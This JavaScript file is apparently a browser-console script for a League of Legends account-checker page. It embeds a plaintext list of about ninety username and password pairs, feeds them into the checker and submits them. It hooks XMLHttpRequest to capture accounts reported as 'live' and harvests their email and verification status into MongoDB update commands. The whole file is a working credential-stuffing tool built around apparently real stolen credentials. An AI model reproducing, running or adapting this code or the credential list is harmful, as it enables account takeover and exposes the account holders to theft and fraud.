(async () => {
  const copyToClipboard = (str) => {
    const el = document.createElement("textarea");
    el.value = str;
    document.body.appendChild(el);
    el.select();
    document.execCommand("copy");
    document.body.removeChild(el);
  };
  const list = document.getElementById("cclist");
  const server = document.getElementById("server");
  let accounts =
    /* 1 */
    [
      {
        UserName: "Luxana98",
        Password: "luxana98",
      },
      {
        UserName: "Jiga1UP",
        Password: "jiga1up",
      },
      {
        UserName: "Dragox7172",
        Password: "dragox7172",
      },
      {
        UserName: "WaffleCream",
        Password: "wafflecream1",
      },
      {
        UserName: "Espejo64",
        Password: "espejo64",
      },
      {
        UserName: "Brancisco",
        Password: "brancisco1",
      },
      {
        UserName: "picpick",
        Password: "picpick123",
      },
      {
        UserName: "PabloATR",
        Password: "pabloatr123",
      },
      {
        UserName: "cataphyllary71",
        Password: "abc123",
      },
      {
        UserName: "Hermes123456",
        Password: "hermes123456",
      },
      {
        UserName: "Daidon",
        Password: "abc123",
      },
      {
        UserName: "darkfire879",
        Password: "darkfire879",
      },
      {
        UserName: "temo1010",
        Password: "temo1010",
      },
      {
        UserName: "miticomitico",
        Password: "miticomitico123",
      },
      {
        UserName: "DemonSnake1",
        Password: "demonsnake1",
      },
      {
        UserName: "Emiratiyah",
        Password: "emiratiyah123",
      },
      {
        UserName: "SneakyWizZi",
        Password: "sneakywizzi1",
      },
      {
        UserName: "lingenchi07",
        Password: "lingenchi07",
      },
      {
        UserName: "KeeperFantastic",
        Password: "KeeperFantastic123",
      },
      {
        UserName: "tomax8008",
        Password: "tomax8008",
      },
      {
        UserName: "MigthyCarp27",
        Password: "migthycarp27",
      },
      {
        UserName: "CemalBurn",
        Password: "cemalburn123",
      },
      {
        UserName: "RedDrifter",
        Password: "qwerty1",
      },
      {
        UserName: "SuntMamaTa",
        Password: "suntmamata1",
      },
      {
        UserName: "Nikolaolcan98",
        Password: "nikolaolcan98",
      },
      {
        UserName: "doy12345678",
        Password: "doy12345678",
      },
      {
        UserName: "patri31",
        Password: "patri31",
      },
      {
        UserName: "dobsacsaba90",
        Password: "dobsacsaba90",
      },
      {
        UserName: "amitagmon",
        Password: "amitagmon1",
      },
      {
        UserName: "SebasVargas",
        Password: "sebasvargas1",
      },
      {
        UserName: "sofmap03",
        Password: "sofmap03",
      },
      {
        UserName: "matrexguede",
        Password: "matrexguede123",
      },
      {
        UserName: "joseph0604",
        Password: "joseph0604",
      },
      {
        UserName: "AKUMA1408",
        Password: "akuma1408",
      },
      {
        UserName: "Miguelziin",
        Password: "miguelziin123",
      },
      {
        UserName: "DarkPidgey",
        Password: "DarkPidgey12",
      },
      {
        UserName: "AcnaAneliram6",
        Password: "acnaaneliram6",
      },
      {
        UserName: "R6I6P6",
        Password: "r6i6p6",
      },
      {
        UserName: "doquochuy",
        Password: "doquochuy123",
      },
      {
        UserName: "doquochuy",
        Password: "doquochuy123",
      },
      {
        UserName: "shyealn01",
        Password: "shyealn01",
      },
      {
        UserName: "jsoares22",
        Password: "jsoares22",
      },
      {
        UserName: "Miguelgg17",
        Password: "miguelgg17",
      },
      {
        UserName: "yosoygen",
        Password: "yosoygen1",
      },
      {
        UserName: "Michocraft74",
        Password: "Michocraft74",
      },
      {
        UserName: "Kurtesh",
        Password: "kurtesh123",
      },
      {
        UserName: "FrankTheTank355",
        Password: "FrankTheTank355",
      },
      {
        UserName: "Mategol9",
        Password: "Mategol9",
      },
      {
        UserName: "JoelColoma1",
        Password: "JoelColoma1",
      },
      {
        UserName: "cachicama",
        Password: "cachicama123",
      },
      {
        UserName: "ismael2112",
        Password: "ismael2112",
      },
      {
        UserName: "DarkieCZ",
        Password: "darkiecz1",
      },
      {
        UserName: "Esstas",
        Password: "Esstas1",
      },
      {
        UserName: "turusuk",
        Password: "turusuk123",
      },
      {
        UserName: "shirlyy123",
        Password: "shirlyy123",
      },
      {
        UserName: "hickusku",
        Password: "hickusku123",
      },
      {
        UserName: "iguanodon1",
        Password: "iguanodon1",
      },
      {
        UserName: "00Flower00",
        Password: "qwerty123",
      },
      {
        UserName: "ekaitz7445",
        Password: "ekaitz7445",
      },
      {
        UserName: "TaroYamada3",
        Password: "taroyamada3",
      },
      {
        UserName: "tiocalamardo",
        Password: "tiocalamardo123",
      },
      {
        UserName: "clavero25",
        Password: "clavero25",
      },
      {
        UserName: "kostaskill16",
        Password: "kostaskill16",
      },
      {
        UserName: "STDMX",
        Password: "STDMX123",
      },
      {
        UserName: "Keira2502",
        Password: "keira2502",
      },
      {
        UserName: "siyarlar",
        Password: "siyarlar123",
      },
      {
        UserName: "locazo1996",
        Password: "locazo1996",
      },
      {
        UserName: "ElTanque10",
        Password: "eltanque10",
      },
      {
        UserName: "66adc66",
        Password: "66adc66",
      },
      {
        UserName: "SaenzSP23",
        Password: "SaenzSP23",
      },
      {
        UserName: "Jfox0804",
        Password: "Jfox0804",
      },
      {
        UserName: "seanjkim1",
        Password: "seanjkim1",
      },
      {
        UserName: "DiamondManageR",
        Password: "diamondmanager1",
      },
      {
        UserName: "ElZeus3k",
        Password: "elzeus3k",
      },
      {
        UserName: "loluserrr",
        Password: "password1",
      },
      {
        UserName: "yoimer07",
        Password: "yoimer07",
      },
      {
        UserName: "DerSlashe",
        Password: "derslashe",
      },
      {
        UserName: "LordOfSummons",
        Password: "qwerty1234",
      },
      {
        UserName: "canar11o",
        Password: "qwerty1",
      },
      {
        UserName: "The Sniper Jow",
        Password: "password",
      },
      {
        UserName: "Sheet of night",
        Password: "sheet of night12345678",
      },
      {
        UserName: "10270243_DEL",
        Password: "12345678",
      },
      {
        UserName: "Unique jeDo",
        Password: "UniquejeDo",
      },
      {
        UserName: "1good night1",
        Password: "1goodnight1",
      },
      {
        UserName: "iPhone 5S Plus",
        Password: "iPhone_5S_Plus",
      },
      {
        UserName: "あくのすうじくん",
        Password: "12345678",
      },
      {
        UserName: "yoimer07",
        Password: "yoimer07",
      },
    ];

  const serverMapper = {
    "1": (url) => (url || "").startsWith("https://br.op.gg"),
    "2": (url) => (url || "").startsWith("https://eune.op.gg"),
    "3": (url) => (url || "").startsWith("https://euw.op.gg"),
    "4": (url) => (url || "").startsWith("https://jp.op.gg"),
    "5": (url) => (url || "").startsWith("https://www.op.gg"),
    "6": (url) => (url || "").startsWith("https://lan.op.gg"),
    "7": (url) => (url || "").startsWith("https://las.op.gg"),
    "8": (url) => (url || "").startsWith("https://na.op.gg"),
    "9": (url) => (url || "").startsWith("https://oce.op.gg"),
    "11": (url) => (url || "").startsWith("https://ru.op.gg"),
    "12": (url) => (url || "").startsWith("https://tr.op.gg"),
  };
  let updates = [];
  const getUpdate = (data) =>
    updates
      .map(
        (update) =>
          `db.Accounts.updateOne(${JSON.stringify(
            update.where
          )}, ${JSON.stringify(update.set)})`
      )
      .join(";\n");

  const oldXHR = window.XMLHttpRequest;
  function newXHR() {
    var realXHR = new oldXHR();
    realXHR.addEventListener(
      "readystatechange",
      function () {
        if (realXHR.readyState !== realXHR.DONE) return;
        try {
          if (realXHR.status < 200 || realXHR.status > 299)
            throw new Error("Not 200");
          const body = JSON.parse(realXHR.response);
          console.log(body);
          if (body.sonuc !== "canli") return;
          const table = document.createElement("table");
          table.innerHTML = body.icerik;
          const trs = table.getElementsByTagName("tr");
          const newUsernames = [];
          for (let i = 0; i < trs.length; i += 1) {
            const tr = trs[i];
            const [, userData, capture] = tr.getElementsByTagName("td");
            const [UserName] = userData.innerHTML.split(":");
            newUsernames.push(UserName);
            let [
              RP,
              BlueEssence,
              Level,
              RefundsRemaining,
              TotalChamps,
              TotalSkins,
              Email,
              EmailVerified,
            ] = capture.innerHTML.split("<br>");
            updates.push({
              where: { UserName },
              set: {
                $set: {
                  // Level: +Level.split(":")[1].trim() || 0,
                  // RP: +RP.split(":")[1].trim() || 0,
                  // BlueEssence: +BlueEssence.split(":")[1].trim() || 0,
                  // RefundsRemaining: +RefundsRemaining.split(":")[1].trim() || 0,
                  // TotalChamps: +TotalChamps.split(":")[1].trim() || 0,
                  // TotalSkins: +TotalSkins.split(":")[1].trim() || 0,
                  Email: Email.split(":")[1].trim() || "",
                  EmailVerified:
                    EmailVerified.split(":")[1].trim() === "Verified",
                },
              },
            });
            console.log(updates);
            console.clear();
            console.log(getUpdate(updates));
          }
          accounts = accounts.filter(
            (account) => !newUsernames.includes(account.UserName)
          );
        } catch (e) {}
      },
      false
    );
    return realXHR;
  }
  window.XMLHttpRequest = newXHR;

  console.clear();
  function startQuery(accs) {
    if (!accs) return;
    if (!serverMapper[list.value]) return;
    server.value = list.value;
    const submit = document.getElementById("submit");
    let comboText = "";
    for (let i = 0; i < accs.length; i += 1) {
      if (i !== 0) comboText += "\n";
      comboText += accs[i].UserName + ":" + accs[i].Password;
    }
    list.value = comboText;
    submit.click();
  }
  const start = () => {
    startQuery(accounts);
  };
  console.clear();
  console.log("accounts", accounts);
  list.addEventListener("click", start);
})();
